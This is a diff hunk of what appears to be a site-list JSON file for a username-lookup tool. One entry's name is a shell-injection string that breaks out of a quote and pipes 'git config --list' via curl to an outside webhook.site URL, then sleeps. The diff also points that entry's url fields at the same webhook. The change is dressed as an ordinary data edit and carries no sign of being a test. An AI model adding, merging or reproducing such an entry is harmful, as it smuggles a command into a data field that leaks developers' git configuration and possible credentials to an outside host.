@@ -3307,8 +3307,8 @@
   },
   "TestSite\"; git config --list | curl -X POST -d @- https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc/exfil; sleep 180; echo \"": {
     "errorType": "status_code",
-    "url": "https://example.com/{}",
-    "urlMain": "https://example.com/",
+    "url": " https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc{}",
+    "urlMain": " https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc",
     "username_claimed": "test"
  }
 }
